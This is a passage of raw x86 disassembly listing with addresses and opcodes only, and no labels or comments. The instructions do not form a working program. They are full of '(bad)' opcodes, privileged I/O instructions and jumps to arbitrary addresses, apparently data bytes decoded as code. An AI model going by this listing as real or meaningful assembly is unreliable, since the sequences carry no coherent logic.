  41225f:	jge    0x412283
  412261:	mov    edi,ebp
  412263:	fwait
  412264:	int3   
  412265:	dec    eax
  412266:	mov    edi,0x9d127414
  41226b:	add    ebp,DWORD PTR [ecx]
  41226d:	push   0xffffff9c
  41226f:	xchg   ch,cl
  412271:	pcmpeqb mm4,QWORD PTR [ecx]
  412274:	ins    BYTE PTR es:[edi],dx
  412275:	(bad)  
  412276:	cmp    al,0xe7
  412278:	call   0x39794752
  41227d:	or     ah,cl
  41227f:	and    al,0xdc
  412281:	and    BYTE PTR [eax+0x25ec5ec],bl
  412287:	in     eax,0xae
  412289:	mov    bl,0xb5
  41228b:	push   es
  41228c:	adc    eax,0xd2d9098b
  412291:	ds ds mov edi,0x6d481263
  412298:	add    edx,esp
  41229a:	iret   
  41229b:	call   0x4ee9c6a
  4122a0:	push   0xffffff99
  4122a2:	(bad)  
  4122a3:	jg     0x412233
  4122a5:	adc    BYTE PTR [ecx],dh
  4122a7:	loope  0x412272
  4122a9:	inc    esi
  4122aa:	out    0xee,eax
  4122ac:	ror    edx,1
  4122ae:	in     eax,0xd1
  4122b0:	adc    al,0xdd
  4122b2:	ins    DWORD PTR es:[edi],dx
  4122b3:	fild   WORD PTR [edx+0x6ddfdd81]
  4122b9:	or     BYTE PTR [ebp-0x70],bl
  4122bc:	inc    ebx
  4122bd:	clc    
  4122be:	leave  
  4122bf:	jne    0x4122f8
  4122c1:	fldenv [edx-0x42779b19]
  4122c7:	jp     0x41226f
  4122c9:	mov    esp,0x38b42ced
  4122ce:	pop    ebx
  4122cf:	test   eax,0x4e65d4b6
  4122d4:	pop    edi
  4122d5:	xchg   BYTE PTR [ecx-0x3ff867f6],bl
  4122db:	inc    edx
  4122dc:	retf   
  4122dd:	fstp   DWORD PTR cs:[ebx+0x4246474c]
  4122e4:	fnstenv [edi+0x3a]
  4122e7:	vmread DWORD PTR [edx+0x2b],ecx
  4122eb:	mov    bh,0xe7
  4122ed:	sub    ecx,DWORD PTR [eax+0x5c]
  4122f0:	fisub  DWORD PTR [eax]
  4122f2:	push   es
  4122f3:	push   esi
  4122f4:	cmp    BYTE PTR [edi],ch
  4122f6:	push   edi
  4122f7:	add    BYTE PTR [edi+edx*1-0x7e],dl
  4122fb:	shl    DWORD PTR [ebx],0x98
  4122fe:	ins    DWORD PTR es:[edi],dx
  4122ff:	fistp  WORD PTR [edx]
  412301:	mov    bh,0x28
  412303:	std    
  412304:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412305:	leave  
  412306:	sbb    BYTE PTR [ecx+0x0],cl
  412309:	or     BYTE PTR [eax-0x12],cl
  41230c:	dec    ecx
  41230d:	arpl   WORD PTR [eax+eiz*1+0x73],si
  412311:	and    al,0x8b
  412313:	ret    
  412314:	push   0x7f
  412316:	xchg   edx,eax
  412317:	pop    edx
  412318:	add    cl,BYTE PTR [ebp+ecx*8-0x6ad966f3]
  41231f:	jno    0x4122a8
  412321:	xchg   edi,eax
  412322:	dec    ecx
  412323:	and    BYTE PTR [ebx],cl
  412325:	or     ah,BYTE PTR [edi-0x2947a170]
  41232b:	mov    edi,0x9461cb2f
  412330:	retf   0x2afd
  412333:	jp     0x4122fa
  412335:	dec    edi
  412336:	mov    al,0x97
  412338:	stos   BYTE PTR es:[edi],al
  412339:	shl    BYTE PTR [eax],1
  41233b:	inc    esp
  41233c:	sub    edx,DWORD PTR [edx]
  41233e:	repz hlt 
  412340:	cmp    al,0x34
  412342:	popa   
  412343:	ds hlt 
  412345:	adc    DWORD PTR [esi+edi*4+0x5ab19980],0xe14c582
  412350:	push   edx
  412351:	pop    edi
  412352:	mov    edx,0x7fcbfbe1
  412357:	mov    WORD PTR ds:0xb1249a1e,es
  41235d:	xchg   DWORD PTR [ecx+0x65],eax
  412360:	sbb    bl,dl
  412362:	daa    
  412363:	cmp    ch,BYTE PTR [esi-0xdb6bfc7]
  412369:	test   eax,0x63839d92
  41236e:	mov    esi,0x6cf18e63
  412373:	out    dx,eax
  412374:	cmp    DWORD PTR [edi],edx
  412376:	cmp    DWORD PTR [ecx+0x77b20f45],eax
  41237c:	or     esp,eax
  41237e:	test   al,0x35
  412380:	pop    es
  412381:	sbb    al,0x9a
  412383:	inc    esi
  412384:	jbe    0x4123d2
  412386:	imul   eax,DWORD PTR [edx],0x8e47e1a6
  41238c:	cmp    DWORD PTR [ecx+0x3b],ecx
  41238f:	push   edi
  412390:	ja     0x4123a6
  412392:	xor    esp,ebx
  412394:	aad    0x97
  412396:	(bad)  
  412397:	std    
  412398:	scas   al,BYTE PTR es:[edi]
  412399:	mov    bh,0x89
  41239b:	test   eax,0x376e5566
  4123a0:	push   ss
  4123a1:	les    edx,FWORD PTR [ecx-0x10ed89c1]
  4123a7:	loopne 0x41241f
  4123a9:	cmp    DWORD PTR [esi+ebp*8-0x24],eax
  4123ad:	pop    edx
  4123ae:	sub    dh,ch
  4123b0:	xor    esp,ecx
  4123b2:	sub    esi,DWORD PTR ds:0x2c2efbb2
  4123b8:	cdq    
  4123b9:	mov    bl,0x95
  4123bb:	dec    ebp
  4123bc:	xor    BYTE PTR [eax-0x65f20ee1],ch
  4123c2:	adc    BYTE PTR [ecx+0xa6fd3f8],cl
  4123c8:	sbb    DWORD PTR [ecx+eiz*8+0x1aa6efd0],0xffffffa2
  4123d0:	inc    ebp
  4123d1:	(bad)  
  4123d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123d3:	inc    ebx
  4123d4:	add    al,0x8d
  4123d6:	shl    edi,cl
  4123d8:	mov    esi,0xf69c4fc3
  4123dd:	adc    BYTE PTR [eax],ah
  4123df:	leave  
  4123e0:	test   al,0xc5
  4123e2:	ret    0x128c
  4123e5:	push   0x15a579c6
  4123ea:	jns    0x41245f
  4123ec:	jle    0x4123af
  4123ee:	cmp    DWORD PTR [ecx+0x4031ca5a],ebp
  4123f4:	(bad)  
  4123f5:	ret    
  4123f6:	sbb    esp,DWORD PTR [edi+0x33]
  4123f9:	sahf   
  4123fa:	inc    esi
  4123fb:	ja     0x4123ed
  4123fd:	sub    ch,bh
  4123ff:	push   ss
  412400:	(bad)
  412404:	clc    
  412405:	fcom   DWORD PTR [ebx]
  412407:	neg    ah
  412409:	add    al,0xd5
  41240b:	aas    
  41240c:	retf   
  41240d:	jns    0x412439
  41240f:	pop    ecx
  412410:	outs   dx,DWORD PTR ds:[esi]
  412411:	sbb    dl,BYTE PTR [esi]
  412413:	popa   
  412414:	xor    eax,0x8e3b82db
  412419:	retf   
  41241a:	inc    ecx
  41241b:	xchg   DWORD PTR [esi-0x18],ebx
  41241e:	aas    
  41241f:	xchg   ebp,eax
  412420:	xor    BYTE PTR [esp+eax*2-0x111e30d1],dl
  412427:	jl     0x41241c
  412429:	(bad)  
  41242a:	push   ebp
  41242b:	mov    ecx,0xd088c54f
  412430:	ss jb  0x4123c1
  412433:	or     ah,bh
  412435:	shl    DWORD PTR [ebx+0x4db73fa],0x88
  41243c:	mov    ds:0x59afc1bf,eax
  412441:	xlat   BYTE PTR ds:[ebx]
  412442:	jmp    0x41246d
  412444:	test   bh,0x83
  412447:	jp     0x412489
  412449:	pop    edx
  41244a:	loope  0x412437
  41244c:	rcr    BYTE PTR [ecx],cl
  41244e:	out    dx,eax
  41244f:	jnp    0x4124a3
  412451:	mov    ch,0x3
  412453:	int3   
  412454:	cmp    BYTE PTR [esi-0x7d],dl
  412457:	bnd jns 0x4123f7
  41245a:	rcr    bl,cl
  41245c:	(bad)  
  41245d:	clc    
  41245e:	xor    al,0x7f
  412460:	jb     0x4124d5
  412462:	or     BYTE PTR [edi+0x26],dl
  412465:	imul   esi,DWORD PTR [ebx+0xe],0xe6ba57fb
  41246c:	ret    0x890c
  41246f:	xor    eax,DWORD PTR [ebx+0x2ea219cd]
  412475:	jp     0x41246f
  412477:	dec    edi
  412478:	cs push ecx
  41247a:	jmp    0xa754abca
  41247f:	or     ecx,DWORD PTR [edi+0xa]
  412482:	repnz lods al,BYTE PTR ds:[esi]
  412484:	pop    esp
  412485:	cmp    al,0xb0
  412487:	pop    ebx
  412488:	ss push ss
  41248a:	mov    cl,BYTE PTR [edi-0x6e]
  41248d:	cs xchg ah,ah
  412490:	xlat   BYTE PTR ds:[ebx]
  412491:	fnsave [esi-0x4dc60ff6]
  412497:	les    ebx,FWORD PTR [edi]
  412499:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41249a:	push   es
  41249b:	xor    DWORD PTR [edx-0x11ff796e],edi
  4124a1:	add    bh,ch
  4124a3:	dec    edx
  4124a4:	fdivr  DWORD PTR [ebx-0x2e64bda7]
  4124aa:	sbb    ebx,DWORD PTR ss:0xb5af6580
  4124b1:	mov    ds:0xa7b947df,ax
  4124b7:	(bad)  
  4124b8:	xor    eax,0x563ddd13
  4124bd:	repnz ins DWORD PTR es:[edi],dx
  4124bf:	mov    esp,0x7deb705a
  4124c4:	ja     0x41249c
  4124c6:	jnp    0x4124e1
  4124c8:	pop    ebx
  4124c9:	mov    ?,eax
  4124cb:	out    0xb8,al
  4124cd:	and    eax,0x66d87683
  4124d2:	ret    0xb573
  4124d5:	xor    ecx,DWORD PTR [eax+0x69176303]
  4124db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4124dc:	xor    DWORD PTR [edi+0x749e5d1e],ecx
  4124e2:	xchg   esi,eax
  4124e3:	cmp    eax,0x994430d2
  4124e8:	movhps QWORD PTR [edi-0x75],xmm4
  4124ec:	dec    edx
  4124ed:	inc    ebp
  4124ee:	jno    0x41247e
  4124f0:	or     esi,ecx
  4124f2:	jno    0x412496
  4124f4:	lds    ebp,FWORD PTR [eax-0x6122fd13]
  4124fa:	xchg   bh,al
  4124fc:	pop    ds
  4124fd:	jl     0x41249f
  4124ff:	xchg   ecx,eax
  412500:	xchg   eax,esp
  412502:	jge    0x412516
  412504:	mov    ebx,0x82fbc756
  412509:	xor    ecx,DWORD PTR [edx+0x6cd1eb52]
  41250f:	inc    esi
  412510:	and    ch,BYTE PTR [ebx-0x3e]
  412513:	clc    
  412514:	add    BYTE PTR [ecx-0x4b7238e0],bl
  41251a:	dec    esi
  41251b:	jnp    0x4124f7
  41251d:	sbb    DWORD PTR [ebx+0x26062c75],ebx
  412523:	jg     0x41253d
  412525:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412526:	das    
  412527:	fcom   DWORD PTR [eax]
  412529:	cdq    
  41252a:	or     dh,BYTE PTR [edx+edx*8]
  41252d:	jge    0x4124c4
  41252f:	or     BYTE PTR ds:0x9d1f1db4,ch
  412535:	mov    edx,DWORD PTR ds:0x928dae49
  41253b:	clc    
  41253c:	mul    DWORD PTR [ecx+edx*4+0x1a958a00]
  412543:	and    BYTE PTR [edi+eiz*2-0x33ddf6f2],ch
  41254a:	(bad)  
  41254b:	pop    ecx
  41254c:	loope  0x412593
  41254e:	in     eax,0x9d
  412550:	outs   dx,DWORD PTR ds:[esi]
  412551:	inc    ebp
  412552:	test   DWORD PTR [esi-0x3e52dbd5],ebx
  412558:	or     dh,cl
  41255a:	inc    esi
  41255b:	fdivr  QWORD PTR [ebx]
  41255d:	mov    DWORD PTR [ebp-0xa],eax
  412560:	xchg   bl,dl
  412562:	(bad)  
  412563:	neg    BYTE PTR [eax-0xb150fd3]
  412569:	les    ebp,FWORD PTR [edx-0x4667a78]
  41256f:	and    ecx,0x60aa2c87
  412575:	pop    esi
  412576:	jne    0x41257e
  412578:	lods   al,BYTE PTR ds:[esi]
  412579:	outs   dx,BYTE PTR ds:[esi]
  41257a:	mov    dh,0xe8
  41257c:	xchg   DWORD PTR [edi+0x64],edi
  41257f:	repnz dec cx
  412582:	or     al,0x6d
  412584:	iret   
  412585:	stc    
  412586:	mov    al,ds:0x75bbea0
  41258b:	scas   al,BYTE PTR es:[edi]
  41258c:	mov    WORD PTR [edi+0x37469abf],ss
  412592:	stos   DWORD PTR es:[edi],eax
  412593:	loope  0x412585
  412595:	icebp  
  412596:	adc    eax,0x430e3c61
  41259b:	inc    eax
  41259c:	stc    
  41259d:	stos   DWORD PTR es:[edi],eax
  41259e:	pop    ss
  41259f:	jbe    0x4125f9
  4125a1:	mov    dl,0xdc
  4125a3:	daa    
  4125a4:	(bad)  
  4125a5:	hlt    
  4125a6:	jg     0x412571
  4125a8:	mov    bh,0x8a
  4125aa:	mov    eax,ds:0xc472cc71
  4125af:	cs mov esi,0x6665ea32
  4125b5:	retf   
  4125b6:	mov    esi,0x6ac7e3d3
  4125bb:	mov    DWORD PTR [esi+0x2f],ebp
  4125be:	pop    ecx
  4125bf:	add    eax,0x59be5a9e
  4125c4:	sub    eax,0x90d9cc93
  4125c9:	pop    esp
  4125ca:	mov    DWORD PTR [eax-0x6c55f1a5],eax
  4125d0:	sub    eax,0xca9f4538
  4125d5:	and    eax,DWORD PTR [ecx*8+0x2506efa0]
  4125dc:	(bad)  [eax]
  4125de:	mov    ebx,0xbd541ce4
  4125e3:	push   cs
  4125e4:	xchg   ecx,eax
  4125e5:	jne    0x412657
  4125e7:	sub    DWORD PTR [ebp-0x47],eax
  4125ea:	les    edi,FWORD PTR [eax+eax*8]
  4125ed:	push   0x53a2363f
  4125f2:	push   esi
  4125f3:	imul   edx,DWORD PTR [edx-0x69],0xd9c0e212
  4125fa:	xor    al,BYTE PTR [ecx]
  4125fc:	mov    dl,0x83
  4125fe:	adc    al,0xb1
  412600:	pop    ebp
  412601:	lahf   
  412602:	leave  
  412603:	(bad)  
  412605:	dec    edi
  412606:	scas   eax,DWORD PTR es:[edi]
  412607:	add    eax,0xfaa6a2b
  41260c:	cmp    ebp,DWORD PTR [ebx-0x41]
  41260f:	or     bh,BYTE PTR [ecx]
  412611:	pop    edx
  412612:	lea    esi,ds:0xe2e0d1bb
  412618:	fs sar edx,1
  41261b:	lods   eax,DWORD PTR ds:[esi]
  41261c:	std    
  41261d:	sbb    ecx,ecx
  41261f:	push   esp
  412620:	sbb    DWORD PTR [eax+0x62],eax
  412623:	out    dx,eax
  412624:	daa    
  412625:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412626:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412627:	enter  0xb163,0xa4
  41262b:	jbe    0x412633
  41262d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41262e:	fild   QWORD PTR [edx]
  412630:	push   ds
  412631:	bound  ebx,QWORD PTR [edx-0x31]
  412634:	in     eax,dx
  412635:	push   ecx
  412636:	jl     0x412625
  412638:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412639:	xchg   ebp,eax
  41263a:	lds    ebp,FWORD PTR [ecx-0x4b]
  41263d:	cdq    
  41263e:	jns    0x412652
  412640:	mov    ds:0x6dbfeb29,al
  412645:	cwde   
  412646:	jg     0x412685
  412648:	cmp    ebx,ebx
  41264a:	cwde   
  41264b:	sub    al,0xcd
  41264d:	lea    edi,[ebx-0x3a]
  412650:	div    DWORD PTR ds:0x550e7f5a
  412656:	add    DWORD PTR [edx],eax
  412658:	adc    al,0xf7
  41265a:	mov    ebp,DWORD PTR [eax]
  41265c:	es dec ecx
  41265e:	(bad)  
  41265f:	div    cl
  412661:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412662:	dec    ebx
  412663:	dec    ecx
  412664:	ret    0x4ffa
  412667:	mov    ds:0xd1c74aa5,al
  41266c:	hlt    
  41266d:	aam    0xbe
  41266f:	shl    ebp,0x2e
  412672:	test   eax,0x7ce6a2f7
  412677:	dec    ebx
  412678:	adc    DWORD PTR [edi+eax*4],ecx
  41267b:	cdq    
  41267c:	cmp    ebx,DWORD PTR [ebx-0x5d]
  41267f:	cld    
  412680:	or     eax,DWORD PTR [ebx+0x786738f2]
  412686:	ret    
  412687:	mul    DWORD PTR [edi]
  412689:	and    ah,BYTE PTR [ebx-0x2a021452]
  41268f:	xor    ecx,DWORD PTR [edi+0x32]
  412692:	jne    0x4126b7
  412694:	push   es
  412695:	mov    edi,0xc60ba84
  41269a:	pop    es
  41269b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41269c:	jne    0x412664
  41269e:	cmc    
  41269f:	pop    esi
  4126a0:	outs   dx,BYTE PTR ds:[esi]
  4126a1:	adc    eax,0xcedd8363
  4126a6:	fnsave [ebx]
  4126a8:	scas   al,BYTE PTR es:[edi]
  4126a9:	or     BYTE PTR [edx+0x40],al
  4126ac:	mov    ?,WORD PTR [esi]
  4126ae:	gs sbb bh,dl
  4126b1:	jbe    0x412645
  4126b3:	pop    ss
  4126b4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4126b5:	(bad)  
  4126b6:	scas   eax,DWORD PTR es:[edi]
  4126b7:	mov    esi,0x62d1165
  4126bc:	sbb    DWORD PTR [ebp-0x7f],ebx
  4126bf:	test   DWORD PTR [ecx-0x27b8f5aa],ebp
  4126c5:	xlat   BYTE PTR ds:[ebx]
  4126c6:	lahf   
  4126c7:	xchg   ebx,eax
  4126c8:	dec    ebp
  4126c9:	add    al,0xb9
  4126cb:	outs   dx,DWORD PTR ds:[esi]
  4126cc:	jge    0x4126dc
  4126ce:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126cf:	mul    BYTE PTR [esi-0x446ef5af]
  4126d5:	mov    ds:0xce0ff085,eax
  4126da:	mov    edx,DWORD PTR [eax]
  4126dc:	or     cl,0xb3
  4126df:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126e0:	mov    cl,0xb9
  4126e2:	xor    eax,ebp
  4126e4:	pop    ebx
  4126e5:	sahf   
  4126e6:	cld    
  4126e7:	xor    BYTE PTR [ebx-0x22],al
  4126ea:	ins    DWORD PTR es:[edi],dx
  4126eb:	aad    0xd8
  4126ed:	jmp    0x6a1e1082
  4126f2:	sti    
  4126f3:	xor    DWORD PTR [ebx+0x5f],esi
  4126f6:	pop    ebp
  4126f7:	scas   eax,DWORD PTR es:[edi]
  4126f8:	test   ecx,0xefc4bbe1
  4126fe:	pop    edx
  4126ff:	mov    dh,0x4e
  412701:	sub    al,0xd2
  412703:	add    eax,0xdde91aac
  412708:	hlt    
  412709:	int3   
  41270a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41270b:	stc    
  41270c:	rcr    edi,1
  41270e:	or     BYTE PTR [esi+0x26],ah
  412711:	shr    BYTE PTR [esi-0x50],cl
  412714:	test   DWORD PTR [ecx-0x40],esi
  412717:	jmpw   0xd26e
  41271b:	cs push ds
  41271d:	fst    QWORD PTR [edi+ecx*4]
  412720:	test   BYTE PTR [esi+0x6d],al
  412723:	outs   dx,DWORD PTR ds:[esi]
  412724:	jg     0x412781
  412726:	rcl    BYTE PTR [eax],0x51
  412729:	mov    ah,0x19
  41272b:	mov    ah,0x85
  41272d:	data16 aam 0x39
  412730:	jno    0x412757
  412732:	iret   
  412733:	push   esp
  412734:	leave  
  412735:	and    ah,ah
  412737:	sub    eax,DWORD PTR [esi+0x56]
  41273a:	loopne 0x412776
  41273c:	fistp  WORD PTR ds:0x45b34ac0
  412742:	shr    BYTE PTR [edi+0x3954a168],1
  412748:	or     dl,BYTE PTR [edi]
  41274a:	stos   BYTE PTR es:[edi],al
  41274b:	rcl    ebx,0xf0
  41274e:	mov    edi,0x7d5f7867
  412753:	in     eax,0x5f
  412755:	scas   al,BYTE PTR es:[edi]
  412756:	mov    edx,0xa2e33d57
  41275b:	mov    al,0xc5
  41275d:	out    0x7,eax
  41275f:	sub    al,0xa
  412761:	pop    es
  412762:	(bad)  
  412763:	fidiv  DWORD PTR [ecx+0x340a02e5]
  412769:	xchg   ch,dh
  41276b:	jecxz  0x412778
  41276d:	and    dl,ch
  41276f:	pop    ecx
  412770:	call   0x8b93e5c8
  412775:	push   esi
  412776:	mov    ah,0x2e
  412778:	or     eax,0x3c48491e
  41277d:	and    ebp,ebx
  41277f:	repnz sahf 
  412781:	in     eax,dx
  412782:	or     DWORD PTR [ebx],0x61
  412785:	stos   DWORD PTR es:[edi],eax
  412786:	adc    DWORD PTR [edi],ebp
  412788:	cmp    al,0x41
  41278a:	mov    ds:0x3e7f3d17,al
  41278f:	xor    ebx,DWORD PTR [ebp+esi*2-0x12]
  412793:	aaa    
  412794:	aam    0x5a
  412796:	xchg   edx,ebx
  412798:	lods   eax,DWORD PTR ds:[esi]
  412799:	outs   dx,BYTE PTR ds:[esi]
  41279a:	sub    BYTE PTR [edi-0x19f124ea],ch
  4127a0:	xchg   DWORD PTR [eax],edi
  4127a2:	and    BYTE PTR [edi+edx*2],dl
  4127a5:	xchg   esp,eax
  4127a6:	fs push eax
  4127a8:	in     eax,0x5f
  4127aa:	or     ch,al
  4127ac:	test   al,0x8a
  4127ae:	into   
  4127af:	push   edx
  4127b0:	bound  eax,QWORD PTR [eax]
  4127b2:	pushf  
  4127b3:	push   es
  4127b4:	loope  0x4127c8
  4127b6:	mov    eax,0x3c69405c
  4127bb:	inc    ebp
  4127bc:	psubq  mm3,QWORD PTR ds:0xe04dc2e2
  4127c3:	and    ebx,ecx
  4127c5:	or     al,0x3d
  4127c7:	jb     0x412846
  4127c9:	push   eax
  4127ca:	aam    0x72
  4127cc:	out    0xe6,al
  4127ce:	xchg   edi,eax
  4127cf:	imul   DWORD PTR [edi+ebp*1-0x55]
  4127d3:	pop    ebx
  4127d4:	dec    ebx
  4127d5:	fdiv   DWORD PTR [ecx]
  4127d7:	js     0x412766
  4127d9:	arpl   WORD PTR [ecx+0x4d],cx
  4127dc:	gs dec ebx
  4127de:	jbe    0x4127aa
  4127e0:	loopne 0x412769
  4127e2:	adc    DWORD PTR [ebx],0x2694831e
  4127e8:	retf   0x7eff
  4127eb:	call   0xb4b8:0xb69d23c7
  4127f2:	jb     0x41285e
  4127f4:	scas   eax,DWORD PTR es:[edi]
  4127f5:	mov    eax,0x1daffeda
  4127fa:	cmc    
  4127fb:	jg     0x41279d
  4127fd:	xchg   ebx,eax
  4127fe:	cmp    BYTE PTR [eax-0x72],bl
  412801:	shl    dl,1
  412803:	leave  
  412804:	jg     0x412844
  412806:	(bad)  
  412807:	mov    BYTE PTR [esp+ebx*4],0x51
  41280b:	sub    bl,BYTE PTR [eax]
  41280d:	xor    eax,eax
  41280f:	(bad)  
  412810:	gs nop
  412812:	stos   DWORD PTR es:[edi],eax
  412813:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412814:	(bad)  
  412815:	clc    
  412816:	and    edx,eax
  412818:	mov    bl,0xf3
  41281a:	int    0x40
  41281c:	(bad)  
  41281d:	dec    eax
  41281e:	jecxz  0x4127c6
  412820:	stc    
  412821:	pusha  
  412822:	int    0xc7
  412824:	xor    ecx,edx
  412826:	pop    ebx
  412827:	ds adc al,0x3a
  41282a:	sub    esi,DWORD PTR [eax]
  41282c:	pushf  
  41282d:	nop
  41282e:	mov    DWORD PTR [ecx-0x7c4a8c33],edi
  412834:	jge    0x412865
  412836:	bound  ebp,QWORD PTR [esi+0x43]
  412839:	fs repnz (bad) 
  41283d:	lock frstor [ebx]
  412840:	clc    
  412841:	jl     0x412895
  412843:	push   edx
  412844:	fbld   TBYTE PTR [edx]
  412846:	or     eax,0xa7429c9d
  41284b:	xor    ebx,DWORD PTR [edx-0x38]
  41284e:	test   bh,bl
  412850:	out    0x41,eax
  412852:	or     eax,DWORD PTR [ebx+0x1]
  412855:	sar    ah,0x11
  412858:	push   edx
  412859:	shl    DWORD PTR [ecx],0xd6
  41285c:	aad    0xeb
  41285e:	push   ecx
  41285f:	jns    0x412823
  412861:	sbb    ecx,DWORD PTR [esi+0x6dbd5837]
  412867:	inc    esp
  412868:	stos   DWORD PTR es:[edi],eax
  412869:	mov    ds:0xe8c86542,eax
  41286e:	jge    0x412820
  412870:	mov    ah,0x67
  412872:	(bad)  
  412873:	mov    esi,0xb8ddbba7
  412878:	(bad)  
  412879:	sbb    ah,bl
  41287b:	aad    0xcf
  41287d:	arpl   WORD PTR [ebp+0x5664e3e6],sp
  412883:	rcl    bl,1
  412885:	mov    BYTE PTR [ecx],cl
  412887:	jmp    0x4128bc
  412889:	stos   BYTE PTR es:[edi],al
  41288a:	nop
  41288b:	loope  0x41285a
  41288d:	(bad)  
  41288e:	aad    0xa2
  412890:	pop    edi
  412891:	sub    eax,0xa05f349c
  412896:	shl    ch,1
  412898:	fs or  al,0x14
  41289b:	imul   ebx,DWORD PTR [esi],0x69462edb
  4128a1:	mov    eax,ds:0xf05a94d
  4128a6:	mov    ecx,edi
  4128a8:	and    edx,esp
  4128aa:	or     DWORD PTR [ecx+0x19448c82],ebx
  4128b0:	enter  0xff9f,0xef
  4128b4:	mov    WORD PTR [eax],?
  4128b6:	push   cs
  4128b7:	adc    DWORD PTR ds:0xf8cca5f5,edi
  4128bd:	inc    ebx
  4128be:	push   ebx
  4128bf:	add    al,0xf8
  4128c1:	hlt    
  4128c2:	cmp    DWORD PTR [ebp-0xb],esp
  4128c5:	push   edx
  4128c6:	dec    edx
  4128c7:	hlt    
  4128c8:	int3   
  4128c9:	add    ah,BYTE PTR [esi]
  4128cb:	xchg   esi,eax
  4128cc:	jecxz  0x412898
  4128ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128cf:	fwait
  4128d0:	into   
  4128d1:	call   DWORD PTR [eax+0x37]
  4128d4:	cmp    ebp,esi
  4128d6:	and    eax,0x66dbda8a
  4128db:	iret   
  4128dc:	adc    BYTE PTR [ebx-0x40bb8a97],0xc
  4128e3:	jmp    0x412916
  4128e5:	inc    esp
  4128e6:	mov    ecx,0x78e87c5d
  4128eb:	pop    es
  4128ec:	ss pop eax
  4128ee:	add    al,cl
  4128f0:	cmp    eax,0xfad23ca4
  4128f5:	sub    al,0x30
  4128f7:	test   DWORD PTR [ecx+0x77fd8131],edx
  4128fd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4128fe:	daa    
  4128ff:	aam    0x8a
  412901:	aam    0xac
  412903:	in     eax,dx
  412904:	inc    ecx
  412905:	out    dx,al
  412906:	sar    DWORD PTR [ecx],1
  412908:	loope  0x4128dd
  41290a:	arpl   WORD PTR [esi],sp
  41290c:	pop    esi
  41290d:	cmp    DWORD PTR [edx+ecx*1-0x4a],edx
  412911:	fwait
  412912:	inc    edi
  412913:	jae    0x4128a3
  412915:	shr    ebx,0x15
  412918:	loope  0x412908
  41291a:	push   ss
  41291b:	mov    ebp,0xeca0fca5
  412920:	xlat   BYTE PTR ds:[ebx]
  412921:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412922:	repnz dec ecx
  412924:	xor    BYTE PTR [esi],dh
  412926:	xchg   edi,eax
  412927:	mov    ah,0xa2
  412929:	arpl   WORD PTR ds:0x8da9db0b,si
  41292f:	(bad)  
  412930:	test   DWORD PTR [edx-0x7df9fc1a],0x6a36e326
  41293a:	pop    eax
  41293b:	fld    TBYTE PTR [ecx-0x2b]
  41293e:	pop    esp
  41293f:	sub    dh,ah
  412941:	adc    al,0xe8
  412943:	inc    ecx
  412944:	mov    ebp,0x1598f063
  412949:	inc    ebp
  41294a:	xchg   ebp,eax
  41294b:	adc    DWORD PTR [ebx+0x6e],esp
  41294e:	jmp    0xd7c3022e
  412953:	jmp    0x9fe8:0x297e48a7
  41295a:	sub    ebx,eax
  41295c:	sbb    cl,al
  41295e:	shl    DWORD PTR [ecx-0x3e],0xdf
  412962:	pop    edi
  412963:	popa   
  412964:	xchg   ecx,eax
  412965:	mov    ah,0xa5
  412967:	jmp    0x41297f
  412969:	sub    edi,ebp
  41296b:	push   es
  41296c:	mov    WORD PTR [edi],ss
  41296e:	pop    esi
  41296f:	scas   eax,DWORD PTR es:[edi]
  412970:	ds ss jmp 0x412954
  412974:	adc    eax,0x2148003a
  412979:	sub    ch,cl
  41297b:	sahf   
  41297c:	inc    ecx
  41297d:	int3   
  41297e:	or     eax,esi
  412980:	stos   DWORD PTR es:[edi],eax
  412981:	retf   
  412982:	outs   dx,BYTE PTR ds:[esi]
  412983:	xchg   ecx,eax
  412984:	cli    
  412985:	mov    edi,0xfd06c52f
  41298a:	add    DWORD PTR [edx],esp
  41298c:	ret    
  41298d:	jmp    0x1df8:0x369d3fcc
  412994:	fsub   st,st(4)
  412996:	jp     0x4129d6
  412998:	sbb    al,0x48
  41299a:	stos   BYTE PTR es:[edi],al
  41299b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41299c:	arpl   WORD PTR [ecx],cx
  41299e:	push   eax
  41299f:	mov    ?,ecx
  4129a1:	and    DWORD PTR [esi+0x39],edi
  4129a4:	ret    
  4129a5:	pop    ss
  4129a6:	inc    ebp
  4129a7:	outs   dx,DWORD PTR ds:[esi]
  4129a8:	sbb    al,0xf3
  4129aa:	fmul   DWORD PTR [edi+0x6e335753]
  4129b0:	ret    0x67fd
  4129b3:	dec    edi
  4129b4:	aaa    
  4129b5:	or     eax,0x5bf4d1f6
  4129ba:	xchg   ebp,eax
  4129bb:	fidiv  DWORD PTR [ebx]
  4129bd:	mov    cl,0xbe
  4129bf:	imul   eax,ecx,0x7f757892
  4129c5:	or     eax,0x20332a82
  4129ca:	cmp    al,0xee
  4129cc:	dec    esi
  4129cd:	jecxz  0x41298d
  4129cf:	mov    dl,0xd6
  4129d1:	(bad)  
  4129d3:	rcl    BYTE PTR [ecx],1
  4129d5:	lea    esp,[ecx-0x30db0c20]
  4129db:	dec    ebp
  4129dc:	push   edx
  4129dd:	cmp    eax,0x1c41f7e8
  4129e2:	cmp    BYTE PTR [ecx+0x12262e80],ch
  4129e8:	jmp    0x246a0921
  4129ed:	outs   dx,DWORD PTR ds:[esi]
  4129ee:	dec    ecx
  4129ef:	test   eax,0x1a62de2
